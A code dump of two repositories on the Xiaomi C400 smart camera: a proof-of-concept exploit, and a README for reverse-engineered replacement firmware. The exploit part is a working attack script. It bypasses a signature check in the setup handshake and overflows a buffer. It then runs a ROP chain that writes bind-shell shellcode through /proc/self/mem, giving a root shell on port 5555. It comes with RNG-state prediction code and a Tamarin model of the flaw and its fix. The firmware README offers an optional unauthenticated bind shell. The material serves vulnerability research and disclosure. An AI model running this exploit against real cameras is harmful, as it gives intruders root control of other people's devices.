`xiaomi-c400-exploit/README.md`:

```md
This repository contains the PoC exploit for the Xiaomi C400 smart camera.
The script `exploit.py` was written for the firmware version `5.1.5_0379`, but
the vulnerability is present in the latest version available to the author,
`5.1.6_0423`.

## Running

To run the script:

1. Connect the camera to power
1. Press and hold the button on the back of the camera for about 10 seconds to
   trigger a factory reset
1. Once the camera restarts, you should connect to the wifi access point it hosts
1. Verify that the camera's IP (your gateway) is `192.168.14.1`
1. Run the script with any package manager compliant with
   [PEP 723](https://peps.python.org/pep-0723/) inline metadata, such as
   [uv](https://github.com/astral-sh/uv).

Note that the exploit has around 10% chance of working. The script will try
again if it fails. Once it succeeds, you should get an interactive shell.
Verify your access by entering the `id` command.

![shell](recordings/shell.gif)

## [Explanation](exploit_explainer.md)

## Firmware downloads

- [5.1.5_0379](firmware/IPC039A04_5.1.5_0379_tf_update.img) (2023-02-10)
- [5.1.6_0420](firmware/IPC039A04_5.1.6_0420_tf_update.img) (2023-12-27)
- [5.1.6_0422](firmware/IPC039A04_5.1.6_0422_tf_update.img) (2024-06-12)
- [5.1.6_0423](firmware/IPC039A04_5.1.6_0423_tf_update.img) (2025-02-14)

## Setup flow protocol

Use Tamarin to verify the vulnerability and the fix for the setup flow:

```sh
tamarin-prover --prove tamarin/setup.spthy
```

```

`xiaomi-c400-exploit/exploit.py`:

```py
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "cryptography==44.0.2",
#     "pwntools==4.14.1",
# ]
# ///

"""
This script gets a root shell on a Xiaomi C400 smart camera, provided that
it is in a factory state, and you are connected to its Access Point.

Written by Botond Hartmann, 2025
"""

from pwn import *
import time
import hashlib
import json
from cryptography.hazmat.primitives import serialization, hashes, hmac, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from base64 import b64encode, b64decode

context.arch = "thumb"
context.endianness = "little"

r: tube = None

CAM_IP = "192.168.14.1"

global_did: bytes = b""
server_start_time: float = 0
token: bytes = b""

def pad(d: bytes)-> bytes:
    padder = padding.PKCS7(128).padder()
    return padder.update(d) + padder.finalize()

def unpad(d: bytes) -> bytes:
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(d) + unpadder.finalize()

def md5(d: bytes) -> bytes:
    return hashlib.md5(d).digest()

def aes_encrypt_nopad(pt: bytes, key: bytes, iv: bytes) -> bytes:
    assert len(key) == 16
    assert len(iv) == 16
    assert len(pt) % 16 == 0
    cipher = Cipher(algorithms.AES128(key), modes.CBC(iv)).encryptor()
    return cipher.update(pt) + cipher.finalize()

def aes_encrypt(pt: bytes, key: bytes, iv: bytes) -> bytes:
    return aes_encrypt_nopad(pad(pt), key, iv)

def aes_decrypt(ct: bytes, key: bytes, iv: bytes) -> bytes:
    assert len(key) == 16
    assert len(iv) == 16
    cipher = Cipher(algorithms.AES128(key), modes.CBC(iv)).decryptor()
    return unpad(cipher.update(ct) + cipher.finalize())

def assemble_raw(payload: bytes, sent_len: bytes|None = None) -> bytes:
    pkt = bytearray()
    pkt += b"\x21\x31\x00\x20"
    pkt += global_did
    pkt += p32(max(0, int(time.time())-server_start_time), endian='big')
    pkt += token
    pkt += payload
    if sent_len is None:
        sent_len = len(pkt)
    pkt[2:4] = p16(sent_len, endian='big')
    pkt[16:32] = md5(pkt[:sent_len])
    return pkt

def assemble_encrypted_nopad(payload: bytes) -> bytes:
    assert len(token) == 16
    key = md5(token)
    iv = md5(key + token)
    return assemble_raw(aes_encrypt_nopad(payload, key, iv))

def assemble_encrypted(payload: bytes) -> bytes:
    return assemble_encrypted_nopad(pad(payload))

def assemble_overflow(payload: bytes, of: bytes) -> bytes:
    assert len(payload)%16 == 0
    key = md5(token)
    iv = md5(key + token)
    cipher = Cipher(algorithms.AES128(key), modes.CBC(iv)).encryptor()
    ct = cipher.update(payload) + cipher.finalize()
    for x in range(2**32):
        pt = p32(x) + of
        assert len(pt) == 16
        ecb = Cipher(algorithms.AES128(key), modes.ECB()).encryptor()
        ct2 = ecb.update(pt) + ecb.finalize()
        assert len(ct2) == 16
        if ct2[-1] == 0:
            log.info(f"brute took {x+1} tries")
            break
    return assemble_raw(ct + ct2, len(ct) + 16 + 15)

def decrypt(pkt: bytes) -> bytes:
    assert len(token) == 16
    key = md5(token)
    iv = md5(key + token)
    return aes_decrypt(pkt[0x20:], key, iv)

def expand_shared_secret(s: bytes) -> bytes:
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=0x20,
        salt=token.hex().encode(),
        info=None,
    )
    return hkdf.derive(s)[:0x10]

def miio_sign(d: bytes, key: bytes) -> bytes:
    hm = hmac.HMAC(key, hashes.SHA256())
    hm.update(d)
    return hm.finalize()

hello_pkt = b""

# magic, len
hello_pkt += b"\x21\x31\x00\x20"

# did
hello_pkt += b"\xff\xff\xff\xff"
hello_pkt += b"\xff\xff\xff\xff"

# packet id
hello_pkt += b"\x00\x00\x00\x00"

# md5
hello_pkt += b"\xff"*16

def send_hello():
    global r, global_did, server_start_time, token
    hello = b""
    with log.progress("sending hello"), context.local(log_level="error"):
        while len(hello) != 0x20:
            try:
                if r is not None:
                    r.close()
                r = remote(CAM_IP, 54321, typ="udp")
                r.send(hello_pkt)
                hello = r.recv(timeout=0.1)
            except EOFError:
                pass
    global_did = hello[4:12]
    server_stamp = u32(hello[12:16], endian='big')
    server_stamp_time = time.time()
    server_start_time = round(server_stamp_time)-server_stamp
    log.info(f"server start at {server_start_time}")
    token = hello[16:32]
    log.info("token is: " + token.decode())

# shellcode = asm(shellcraft.thumb.linux.bindsh(5555, "ipv4"), arch="thumb")
shellcode = bytes.fromhex("4ff001074fea072707f119074ff002004ff0010182ea020201df0646004901e0020015b306b469464ff0100207f1010701df30464ff0010107f1020701df304681ea010182ea020207f1010701df06464ff002014ff03f07304601df0139fbd54ff0680780b4dff8047001e02f2f2f7380b4dff8047001e02f62696e80b468464ff00d074feac72707f1730780b487ea070780b44ff00401694402b4694682ea02024ff00b0741df")

payload2ptr = 0xb6972

payload = b""
payload += p32(0)*4
payload += p32(0x000156ed)
payload += p32(0x000158cd)
payload += p32(0x00000000)
# 0x00041be0 : ldr r0, [r3, #4] ; ldr r2, [r3] ; blx r2
payload += p32(0x00041be0 | 1) # pc
payload += p32(0x00015485)
payload += p32(0x00015805)
payload += p32(0x000157a1)
payload += p32(0) * 3
payload += p32(payload2ptr) # r3
payload += p32(0x000806dc)
payload += p32(0x3)
payload += p32(0x7)
payload += p32(0x8)
payload = payload.ljust(0x60, b'\xff')
assert len(payload) == 0x60

rop_payload_offset = 0x46

payload2 = bytearray(cyclic(rop_payload_offset))
payload2[4:8] = p32(payload2ptr+rop_payload_offset-0x20) # r0, r7, sp
# 0x000364a2 : ldr r2, [r3, #0x2c] ; ldr r1, [r3, #0x30] ; blx r2
payload2[0:4] = p32(0x000364a2 | 1)
# 0x00071dd8 : mov r7, r0 ; add r0, sp, #0x14 ; str r0, [sp] ; ldr r4, [r1, #8] ; ldr r0, [r1] ; ldr r5, [sp, #0x50] ; blx r4
payload2[0x2c:0x2c+4] = p32(0x00071dd8 | 1)
payload2[0x30:0x30+4] = p32(payload2ptr) # r1
# 0x0004f87c : mov sp, r7 ; pop.w {r4, r5, r6, r7, r8, sb, sl, fp, pc}
payload2[8:8+4] = p32(0x0004f87c | 1)


new_fd = 30
mem_path_start = payload2ptr + 12
mem_path = b"/proc/self/mem"
payload2[12:12+len(mem_path)+1] = mem_path + b"\0"

shellcode_target_ptr = 0x13000
rop_payload_len = 0x404
rop_payload = b""

def call_func(fn, arg1=0, arg2=0, arg3=0):
    global rop_payload
    # 0x0004bb18 : pop {r0, r1, r2, r3, r5, pc};
    rop_payload += p32(0x0004bb18 | 1)
    rop_payload += p32(arg1)
    rop_payload += p32(arg2)
    rop_payload += p32(arg3)
    rop_payload += p32(fn)
    rop_payload += p32(0)
    # 0x00071052 : pop.w {r4, lr} ; bx r3
    rop_payload += p32(0x00071052 | 1)
    rop_payload += p32(0)

plt_open = 0x1246c # exe.sym.open
plt_lseek = 0x12334 # exe.sym.lseek
plt_write = 0x122a4 # exe.sym.write
for _ in range(30):
    call_func(plt_open, mem_path_start, constants.O_RDWR)
call_func(plt_lseek, new_fd, shellcode_target_ptr, constants.SEEK_SET)
call_func(plt_write, new_fd, payload2ptr+rop_payload_offset+rop_payload_len, len(shellcode))

rop_payload += p32(shellcode_target_ptr | 1)

print(hex(len(rop_payload)))
assert len(rop_payload) == rop_payload_len
payload2 += rop_payload
payload2 += shellcode

def pwn():
    send_hello()

    SZ = 0x30
    chunk = b""
    chunk = chunk.ljust(SZ, b"\xff")
    pwner = assemble_overflow(chunk, 
        p32(0x19)
        + p32(0xa347c)
        + p32(0xcafebabe))


    priv = ec.generate_private_key(ec.SECP256R1())
    pub = priv.public_key()
    pub_bytes = pub.public_bytes(
        encoding=serialization.Encoding.X962,
        format=serialization.PublicFormat.UncompressedPoint
    )
    r.send(assemble_encrypted(b'{"id":1,"method":"miIO.handshake","params":{"type":1}}'))
    r.recv()


    r.send(assemble_encrypted(json.dumps({
        "id":1,
        "method": "miIO.handshake",
        "params":{
            "type": 2,
            "ecdh":{
                "mode": 0,
                "curve_suite": 3,
                "sign_suite": 1,
                "public_key": b64encode(pub_bytes).decode()
            }
        }
    }).encode()))
    d = json.loads(decrypt(r.recv()).decode())
    peer_public_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), b64decode(
        d["result"]["ecdh"]["public_key"]
    ))
    ext_info_ct = b64decode(d["result"]["ecdh"]["extent"])
    shared_secret = priv.exchange(ec.ECDH(), peer_public_key)
    hmac_key = expand_shared_secret(shared_secret)
    d = json.loads(aes_decrypt(ext_info_ct, hmac_key, b"\0"*16))
    peer_ext_public_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), b64decode(
        d["public_key"]
    ))


    r.send(assemble_encrypted(json.dumps({
        "id":1,
        "method": "miIO.handshake",
        "params":{
            "type": 3,
            "oob": {
                "mode": 2,
                "step": 1,
            }
        }
    }).encode()))
    d = json.loads(decrypt(r.recv()).decode())
    pinsign = b64decode(d["result"]["oob"]["sign"])


    r.send(assemble_encrypted(json.dumps({
        "id":1,
        "method": "miIO.handshake",
        "params":{
            "type": 3,
            "oob": {
                "step": 2,
                "sign": b64encode(pinsign).decode()
            }
        }
    }).encode()))
    d = json.loads(decrypt(r.recv()).decode())
    remote_random = b64decode(d["result"]["oob"]["random"])


    r.send(assemble_encrypted(json.dumps(obj={
        "id":1,
        "method": "miIO.handshake",
        "params":{
            "type": 3,
            "oob": {
                "step": 3,
                "random": b64encode(remote_random).decode()
            }
        }
    }).encode()))
    d = json.loads(decrypt(r.recv()).decode())
    handshake_iv = b64decode(d["result"]["oob"]["iv"])


    ext_shared_secret = priv.exchange(ec.ECDH(), peer_ext_public_key)
    ext_key = expand_shared_secret(ext_shared_secret)
    data = b"foobarxxxxxxxxxx"
    data_ct = aes_encrypt(data, hmac_key, handshake_iv)
    edata = b""
    edata_ct = aes_encrypt(edata, ext_key, handshake_iv)
    r.send(assemble_encrypted(json.dumps({
        "id":1,
        "method": "miIO.config_router_safe",
        "params":{
            "data": b64encode(data_ct).decode() ,
            # invalid, should be: b64encode(miio_sign(data_ct, hmac_key)).decode()
            "sign": "foo",
            "extents": {
                "public_key": b64encode(pub_bytes).decode(),
                "data": b64encode(edata_ct).decode(),
                # invalid, should be: b64encode(miio_sign(edata_ct, ext_key)).decode()
                "sign": "foo"
            }
        }
    }).encode()))
    r.recv()

    r.send(pwner)

    r.send(assemble_encrypted(b"x"))
    r.send(assemble_encrypted_nopad(payload))
    r.send(assemble_encrypted(b"x"))

while True:
    log.warn("trying exploit...")
    pwn()

    r.send(hello_pkt)
    try:
        L = r.recv(timeout=0.1)
    except EOFError:
        L = b""
    if len(L) > 0:
        log.info("good, triggering")
        r.send(assemble_encrypted(b'{"id":1,"method":"miIO.info"}\0' + payload2))
        with log.progress("connecting to shell"):
            while True:
                try:
                    sleep(1)
                    s = remote("192.168.14.1", 5555)
                    break
                except Exception:
                    pass
        s.interactive()
        break

```

`xiaomi-c400-exploit/figures/handshake-sequence-pwn.typ`:

```typ
#import "@preview/chronos:0.2.1"
#set page(margin: 5mm, width: auto, height: auto)
#chronos.diagram({
  import chronos: *
  _par(
    "X",
    display-name: [exploit script],
  )
  _par(
    "M",
    display-name: [#align(center)[
        `miio_client` binary #linebreak() on the camera
      ]],
  )

  _seq("X", "M", comment: [Start handshake])
  _seq("M", "X", comment: [$R_0$ (unused)])
  _sync({
    _seq("X", "X", comment: [Generate keypair $(s_1,p_1)$], flip: true, comment-align: "right")
    _seq("M", "M", comment: [Generate keypair $(s_2,p_2)$])
  })
  _seq("X", "M", comment: [$p_1$])
  _seq("M", "X", comment: [$p_2$])

  _seq("M", "M", comment: [Compute $K = "HKDF"("ECDH"(s_2, p_1), "salt")$])
  _seq("M", "M", comment: [Generate random prefix $R_2$])
  _seq("M", "M", comment: [Compute $H_2="HMAC"(K, R_2 || "code")$])
  _seq("M", "X", comment: [$H_2$])
  _seq("X", "M", comment: [$H_2$])
  _seq("M", "X", comment: [$R_2$])
  _seq("X", "M", comment: [$R_2$])
  _seq("M", "M", comment: [Verify that $H_2="HMAC"(K, R_2 || "code")$])
})

```

```typ
#import "@preview/chronos:0.2.1"
#set page(margin: 5mm, width: auto, height: auto)
#chronos.diagram({
  import chronos: *
  _par(
    "X",
    display-name: [#align(center)[
        Xiaomi Home #linebreak() Application
      ]],
  )
  _par(
    "M",
    display-name: [#align(center)[
        `miio_client` binary #linebreak() on the camera
      ]],
  )

  _seq("X", "M", comment: [Start handshake])
  _seq("M", "X", comment: [$R_0$ (unused)])
  _sync({
    _seq("X", "X", comment: [Generate keypair $(s_1,p_1)$], flip: true, comment-align: "right")
    _seq("M", "M", comment: [Generate keypair $(s_2,p_2)$])
  })
  _seq("X", "M", comment: [$p_1$])
  _seq("M", "X", comment: [$p_2$])

  _sync({
    _seq("X", "X", comment: [Compute $K = "HKDF"("ECDH"(s_1, p_2), "salt")$], flip: true, comment-align: "right")
    _seq("M", "M", comment: [Compute $K = "HKDF"("ECDH"(s_2, p_1), "salt")$])
  })
  _sync({
    _seq("X", "X", comment: [Generate random prefix $R_1$], flip: true, comment-align: "right")
    _seq("M", "M", comment: [Generate random prefix $R_2$])
  })
  _sync({
    _seq("X", "X", comment: [Compute $H_1="HMAC"(K, R_1 || "code")$], flip: true, comment-align: "right")
    _seq("M", "M", comment: [Compute $H_2="HMAC"(K, R_2 || "code")$])
  })
  _seq("M", "X", comment: [$H_2$])
  _seq("X", "M", comment: [$H_1$])
  _seq("M", "X", comment: [$R_2$])
  _seq("X", "M", comment: [$R_1$])
  _sync({
    _seq("X", "X", comment: [Verify that $H_2="HMAC"(K, R_2 || "code")$], flip: true, comment-align: "right")
    _seq("M", "M", comment: [Verify that $H_1="HMAC"(K, R_1 || "code")$])
  })
})

`xiaomi-c400-exploit/rng_prediction/predict.py`:

```py
from z3 import BitVecRef, Or, Solver, BitVec, LShR, sat, unsat
from pwn import log, p32, u32

solver = Solver()
state: list[BitVecRef] = []
known_state: None | list[int] = None

def feed(x: int) -> None:
    assert 0 <= x < 2**32
    s = BitVec(f"state_{len(state)}", 32)
    solver.add(LShR(s, 1) + 1000 == x)
    ls = len(state)
    if ls >= 31:
        solver.add(state[ls-3] + state[ls-31] == s)
    state.append(s)

def feed16(x: bytes) -> None:
    assert len(x) == 16
    feed(u32(x[0:4]))
    feed(u32(x[4:8]))
    feed(u32(x[8:12]))
    feed(u32(x[12:16]))

def known() -> bool:
    global known_state
    if known_state is not None:
        return True
    if len(state) < 31:
        return False
    assert solver.check() == sat
    m = solver.model()
    solver.push()
    ls = len(state)
    solver.add(Or(*(
        state[ls-i] != m.eval(state[ls-i])
        for i in range(1, 32)
    )))
    k = solver.check() == unsat
    solver.pop()
    if k:
        log.info(f"rng state known after {ls} leaks")
        known_state = [m.eval(state[ls-31+i]).as_long() for i in range(31)]
    else:
        log.info(f"rng state not certain after {ls} leaks")
    return k

def next() -> int:
    assert known_state is not None
    ls = len(known_state)
    x = (known_state[ls-3] + known_state[ls-31]) % 2**32
    known_state.append(x)
    return ((x >> 1) + 1000) % 2**32

def next16() -> bytes:
    return p32(next()) + p32(next()) + p32(next()) + p32(next())

```

`xiaomi-c400-exploit/rng_prediction/rngpoc.py`:

```py
from pwn import *
import time
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import re
import random
import json
from cryptography.hazmat.primitives import serialization, hashes, hmac
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF, HKDFExpand
from base64 import b64encode, b64decode
from pprint import pp

import predict

r: tube = None

fb: tube = None

CAM_IP = "192.168.14.1"

global_did = None
server_stamp = None
server_stamp_time = None
token: bytes = None

def md5(d):
    return hashlib.md5(d).digest()

def aes_encrypt(pt: bytes, key: bytes, iv: bytes) -> bytes:
    assert len(key) == 16
    assert len(iv) == 16
    return AES.new(key, AES.MODE_CBC, iv=iv).encrypt(pad(pt, 16))

def aes_decrypt(ct: bytes, key: bytes, iv: bytes) -> bytes:
    assert len(key) == 16
    assert len(iv) == 16
    return unpad(AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct), 16)

def assemble_raw(payload, sent_len=None):
    pkt = bytearray()
    pkt += b"\x21\x31\x00\x20"
    pkt += global_did
    pkt += p32(server_stamp + int(time.time() - server_stamp_time), endian='big')
    pkt += token #b"\0"*16
    pkt += payload
    if sent_len is None:
        sent_len = len(pkt)
    pkt[2:4] = p16(sent_len, endian='big')
    pkt[16:32] = md5(pkt[:sent_len])
    return pkt

def assemble_encrypted(payload):
    assert len(token) == 16
    key = md5(token)
    iv = md5(key + token)
    return assemble_raw(aes_encrypt(payload, key, iv))

def assemble_overflow(payload, of):
    assert len(payload)%16 == 0
    key = md5(token)
    iv = md5(key + token)
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(payload)
    ecb = AES.new(key, AES.MODE_ECB)
    for x in range(2**32):
        pt = p32(x) + of
        assert len(pt) == 16
        ct2 = ecb.encrypt(pt)
        assert len(ct2) == 16
        if ct2[-1] == 0:
            print(f"brute took {x+1} tries")
            break
    return assemble_raw(ct + ct2, len(ct) + 16 + 15)

def decrypt(pkt):
    assert len(token) == 16
    key = md5(token)
    iv = md5(key + token)
    return aes_decrypt(pkt[0x20:], key, iv)

hello_pkt = b""

# magic, len
hello_pkt += b"\x21\x31\x00\x20"

# did
hello_pkt += b"\xff\xff\xff\xff"
hello_pkt += b"\xff\xff\xff\xff"

# packet id
hello_pkt += b"\x00\x00\x00\x00"

# md5
hello_pkt += b"\xff"*16 # value doesn't matter
# hello_pkt += b"MDID" + cyclic(12) #b"\x00"*12

def send_hello():
    global r, global_did, server_stamp, server_stamp_time, token
    hello = b""
    with log.progress("sending hello"), context.local(log_level="error"):
        while len(hello) != 0x20:
            # log.info("sending hello")
            try:
                if fb is not None:
                    fb.clean(timeout=0)
                if r is not None:
                    r.close()
                r = remote(CAM_IP, 54321, typ="udp")
                r.send(hello_pkt)
                hello = r.recv(timeout=0.1)
            except EOFError:
                pass
    global_did = hello[4:12]
    server_stamp = u32(hello[12:16], endian='big')
    server_stamp_time = time.time()
    log.info(f"server start at {round(server_stamp_time)-server_stamp}")
    token = hello[16:32]
    log.info("token is: " + token.decode())


wanted_addr = 0x000ac270

send_hello()

### PREDICTION START
pnum = 0
while not predict.known():
    pnum += 1
    log.info(f"sending packet {pnum}")
    r.send(assemble_encrypted(b'{"id":1,"method":"miIO.handshake","params":{"type":1}}'))
    d = json.loads(decrypt(r.recv()).decode())
    predict.feed16(b64decode(d["result"]["ecdh"]["random"]))


log.info("verifying RNG state")
r.send(assemble_encrypted(b'{"id":1,"method":"miIO.handshake","params":{"type":1}}'))
d = json.loads(decrypt(r.recv()).decode())
assert d["result"]["ecdh"]["random"] == b64encode(predict.next16()).decode()
log.info("RNG state verified")

predictions = [predict.next16() for _ in range(20)]
for p in predictions:
    print("predict:", b64encode(p).decode())
### PREDICTION END

```

`xiaomi-c400-exploit/tamarin/setup.spthy`:

```spthy
theory setup
begin
builtins: diffie-hellman, hashing

// A the QR code, unknown by the attacker
rule Preshared_code:
    [Fr(~code)]
    --[StaticCode(~code)]->
    [!Code(~code)]

rule Phone_1:
    [Fr(~sk), !Code(~code)]
    --[PhoneKeypair(~sk, 'g'^~sk)]->
    [Phone_1(~sk, ~code), Out(<'1', 'g'^~sk>)]

rule Camera_1:
    let KK = h(pk^~sk) in
    [Fr(~sk), Fr(~r), !Code(~code), In(<'1', pk>)]
    --[
        _restrict(not(pk=DH_neutral)),
        CameraKeypair(~sk, 'g'^~sk),
        CameraSharedKey(pk, 'g'^~sk, KK)
    ]->
    [Camera_1(~sk, ~code, pk, KK, ~r), Out(<'2', 'g'^~sk, h(<KK, ~r, ~code>)>)]

// The attacker was able to predict the private key and the random value
// generated by the camera
rule RevealCamera:
    [Camera_1(~sk, ~code, pk, KK, ~r)]
    --[
        _restrict(not(Ex #i. RevealCamera(~sk)@i)),
        RevealCamera(~sk)
    ]->
    [Camera_1(~sk, ~code, pk, KK, ~r), Out(<'r1', ~sk, ~r>)]


rule Phone_2:
    let KK = h(pk^~sk) in
    [Phone_1(~sk, ~code), Fr(~r), In(<'2', pk, ch>)]
    --[
        _restrict(not(pk=DH_neutral)),
        PhoneRandom(~sk, ~r),
        PhoneSharedKey(pk, 'g'^~sk, KK)
    ]->
    [Phone_2(~sk, ~code, pk, KK, ~r, ch), Out(<'3', h(<KK, ~r, ~code>)>)]

rule Camera_2:
    [Camera_1(~sk, ~code, pk, KK, ~r), In(<'3', ph>)]
    --[CameraRandom(~sk, ~r), CameraGotHashes(h(<KK, ~r, ~code>), ph, ~code, ~sk)]->
    [Camera_2(~sk, ~code, pk, KK, ~r, ph), Out(<'4', ~r>)]

rule Phone_3:
    [
        Phone_2(~sk, ~code, pk, KK, ~r, h(<KK, cr, ~code>)),
        In(<'4', cr>)
    ]
    --[PhoneVerified(~sk, pk, cr, KK, ~code)]->
    [Phone_3(~sk, ~code, pk, KK), Out(<'5', ~r>)]

rule Camera_3:
    [
        Camera_2(~sk, ~code, pk, KK, ~r, h(<KK, pr, ~code>)),
        In(<'5', pr>)
    ]
    --[CameraVerified(~sk, pk, pr, KK, ~code)]->
    [Camera_3(~sk, ~code, pk, KK)]

// The protocol can be executed normally
lemma Executable:
    exists-trace
    "
        Ex ck csk cr pk psk pr shk c #i #j #k #l #m #n #o #p #q.
        StaticCode(c)@k &
        CameraSharedKey(pk, ck, shk)@n & PhoneSharedKey(ck, pk, shk)@q &
        PhoneKeypair(psk, pk)@l & CameraKeypair(csk, ck)@m &
        PhoneRandom(psk, pr)@o & CameraRandom(csk, cr)@p &
        PhoneVerified(psk, ck, cr, shk, c)@i & CameraVerified(csk, pk, pr, shk, c)@j &
        not(Ex rk #r. RevealCamera(rk)@r)
    "

// The attacker never learns the QR code
lemma SecrecyC:
    "All c #i. StaticCode(c)@i ==> not (Ex #j. K(c)@j)"

// VULNERABILITY: it's possible for the camera to think it verified that its
// peer knows the QR code, but the attacker knows the session key
lemma NonSecrecyK:
    exists-trace
    "Ex csk pk pr shk c #i #j.
    CameraVerified(csk, pk, pr, shk, c)@i &
    K(shk)@j &
    not(Ex rk #r. RevealCamera(rk)@r)"

// (helper) No two sessions share a secret key from the camera's perspective
lemma NoReusedSecretC [reuse]:
    "All a1 b1 a2 b2 shk #i #j.
    CameraSharedKey(a1, b1, shk)@i & CameraSharedKey(a2, b2, shk)@j 
    ==> #i = #j"

// (helper) No three sessions share a secret key from the phone's perspective
// (two is possible, if the attacker makes two phones establish a session with
// each other)
lemma NoReusedSecretP [reuse]:
    "All a1 b1 a2 b2 a3 b3 shk #i #j #k.
    PhoneSharedKey(a1, b1, shk)@i &
    PhoneSharedKey(a2, b2, shk)@j &
    PhoneSharedKey(a3, b3, shk)@k
    ==> #i = #j | #i = #k | #j = #k"

// FIX: if the camera checks that the hash it got is not the same as the one it
// sent, then the previous attack is not possible
lemma SecrecyKNE:
    "All ch csk pk ph pr shk c #i #k.
    CameraVerified(csk, pk, pr, shk, c)@i &
    CameraGotHashes(ch, ph, c, csk)@k &
    not(ch = ph)
    ==> not (Ex #j. K(shk)@j)"

lemma DHSecrecy:
    "All a1 a2 a3 a4 shk #k #l.
    CameraSharedKey(a1, a2, shk)@k & PhoneSharedKey(a3, a4, shk)@l
    ==>
    not(Ex #kk. K(shk)@kk)"

end

```

`xiaomi-c400-jailbreak/README.md`:

```md
This repository is a reverse-engineered alternative firmware for the Xiaomi
C400 smart camera.

## Operation

The camera, when plugged in, will start recording to the SD card, if it has one.

It will also try to connect to the configured wifi network. When successful, it
will try to establish a TLS connection to the configured IP address, verifying
the server's certificate and identifying itself with its own certificate.

On the TLS connection, the camera will send an MPEG-TS stream containing HEVC
video and Opus audio. The server can send the one-byte commands to control the
camera.

The LED above the camera lens indicates the current state of recording:

- orange when the feed is being recorded to the SD card but not transmitted
- bright blue when the feed is actively being transmitted to the server

## Configuration

Before building, the following files have to be placed in the `config/`
directory:

- `device.crt` and `device.key`: The public and private keys of the device (PEM
  format)
- `server.crt`: The public key of the server (PEM format)
- `wpa_supplicant.conf`: To configure the wifi network
- `config.env`: The following options are available:
  - `SERVER_ADDR=192.168.xx.yy`: The IP address to connect to, required
  - `SERVER_PORT=zzzz`: The port to connect to, required
  - `BINDSHELL=1`: VERY INSECURE! Start an unencrypted, unauthenticated bind
    shell on TCP port 1337, optional

The `create_keys.sh` provides a simple way to generate the keys for both the
device and the server. The server's private key will be placed in
`private/server.key`.

## Building

A working `armv7l-unknown-linux-gnueabihf` cross toolchain is required. The
following dependencies need to be installed in the `deps/` directory:

- `linux`: containing the kernel headers for linux 4.9.84 on arm
- `mbedtls`: version 2.25.0, only the headers are required
- `media-server`: from [github](https://github.com/ireader/media-server),
  tested with commit `9356ea617b3b1c0096475b2ceb6659578cf38d0f`
- `opus`: version 1.1.4, only the headers are required
- `uClibc`: uClibc-ng version 1.0.31, built with the provided `uclibc-config`

The `build.sh` script builds the `build/root.tar.xz.uu` file, which will be
needed for installation.

The above steps can be automated with the
[nix package manager](https://nixos.org/), using `$(nix-build)/root.tar.xz.uu`.

## Installation

Prerequisite: you have a shell on the device.

Paste the following command, then press enter:

```sh
cd / && uudecode -o- | xz -d | tar -xf- && reboot -f
```

Now, copy the contents of `root.tar.xz.uu` into the shell. If everything went
right, your shell connection should close, and the device should reboot and
start the jailbreak firmware.

## Factory reset

If you want to remove the jailbreak and reset the device to its original state:

1. Disconnect the device from power
1. Remove the SD card (if present)
1. Place a file named `factory_reset` at the root of the SD card. The contents
   are irrelevant and can be empty.
1. Insert the SD card into the device
1. Plug the device into power

After a few seconds, the device should boot into its original firmware. You can
inspect the SD card, the `factory_reset` file should be deleted if the process
worked.

## Receiving the live feed

On the server, you can use the following command to view and control the camera
with low latency:

```sh
socat -d2 -T 5 OPENSSL-LISTEN:12345,forever,fork,cert=config/server.crt,key=private/server.key,cafile=config/device.crt STDIO |
ffplay -hide_banner -loglevel error -fflags nobuffer -flags low_delay -framedrop -infbuf -i -
```

You might need to
press the right arrow in the `ffplay` window to make sure you're viewing the
latest frames with as low latency as possible.

## Controls

The server can send one-byte commands to the device over the TLS connection.
With the aboeve `socat` command, this is achieved by typing into the terminal.
The available commands are:

- `u`, `d`, `l`, `r`: use the motors to move the camera up, down, left or right
  respectively
- `F`, `f`: enable or disable the IR filter (enable it to have accurate colors,
  disable it to have much better night visibility using the IR lights on the
  camera)

## Advanced feed processing

The repository contains a `docker-compose.yml` for a more complex example of
how to receive the video feed.

It uses `socat` to receive the feed, ffmpeg to transcode it, then sends it to
a [mediamtx](https://github.com/bluenviron/mediamtx) server for broadcasting.

Using [caddy](https://caddyserver.com/) as a reverse proxy, it hosts a
[frigate](https://frigate.video/) server (can be disabled, it is quite heavy)
and a simple in-browser feed viewer and controller.

After a `docker compose up` command, you should be able to connect to
https://localhost to connect to frigate, and
https://localhost/browser-viewer to connect to
the simple viewer.

Note that you won't be able to control the camera through frigate, as it only
supports the complex ONVIF protocol for that. A proxy could be written to
translate ONVIF to the simple one-byte commands that the camera understands.

For a production setup, you will need to add an authentication service and
configure caddy to validate all requests.

## Decrypting the contents of the SD card

The device will create a `recordings/` and a `keys/` directory on the SD card.
Files will be named sequentially increasing integers. The oldest ones will be
automatically deleted when the SD card is full.

- `keys/` will have SEC 1 v2.0 binary compressed format elliptic curve public
  keys
- `recordings/` will have the encrypted MPEG-TS streams

The streams are encrypted according to the `AES128_GCM_HKDF_4KB` streaming AEAD
scheme of Google's Tink library, as documented
[here](https://developers.google.com/tink/streaming-aead/aes_gcm_hkdf_streaming)
, with the key being the ECDH shared secret of the key in `keys/` and the
server's key (from `config/server.crt`), and the name of the file (the number)
as additional data.

A `decrypt.py` script is provided to decrypt the recordings. Please make sure
not to modify the recording's filename, as this will be checked for tampering
too. The script can be run by any package manager compliant with
[PEP 723](https://peps.python.org/pep-0723/) inline metadata, such as
[uv](https://github.com/astral-sh/uv).

## Threat model

Assuming the `BINDSHELL` option is not used, the device should be resistant to
remote attacks.

The device will only connect to the wifi network specified in
`wpa_supplicant.conf`.

No listening processes are started, the only connection made is
to the specified `SERVER_ADDR`, which will be checked to have the correct
configured certificate, so impersonation of the server is not possible. If the
server is reachable locally, no connection to the internet is required.

It is recommended for the server to verify that the incoming connection has
the correct certificate, so that an attacker cannot start a "fake" camera
connection. (The above `socat` command already does this.)

The recordings made by the device are resistant to attack: because of the
